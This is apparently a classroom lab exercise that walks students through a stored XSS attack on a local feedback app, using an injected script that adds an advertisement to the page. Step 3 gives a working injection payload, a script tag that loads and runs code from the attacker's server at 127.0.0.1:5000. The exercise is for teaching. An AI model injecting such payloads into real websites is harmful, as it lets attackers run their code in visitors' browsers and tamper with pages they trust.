Show ads using XSS attack
======================
In this activity, you will perform XSS attack and add script to show advertisement on the webpage

<img src= "https://s3-whjr-curriculum-uploads.whjr.online/3e51a017-9fab-46bc-b246-94f171ccb3b5.gif" width = "100%" height = "50%">


Follow the given steps to complete this activity.


1. Open the script in `ScriptServer/static` folder.
   * Include jQuery from CDN
   ```
   var script = document.createElement('script');
   script.src = 'https://code.jquery.com/jquery-3.6.4.min.js';
   document.head.appendChild(script);
   ```
2. Write script to add advertisement to the `body` of html page
   * Add flag variable to check if advertisement is added or not.
   ```
   var advertisementAdded = false;
   ```
   * Check the value of flag variable and if advertisement is not added then add advertisement
   ```
   if (advertisementAdded == false) {
      var advertisementHTML = '<img style="width: 45%" src="https://s3-whjr-curriculum-uploads.whjr.online/8c849248-90b4-4752-93b4-8bdc0ae5a2cb.png">';

      $('body').append(advertisementHTML);

      advertisementAdded = true;
   }

   ```
3. Run the Feedback app and perform XSS attack by adding following script:
```
<script src="http://127.0.0.1:5000/script"></script>
```

Check if the advertisement is shown after the attack is performed.
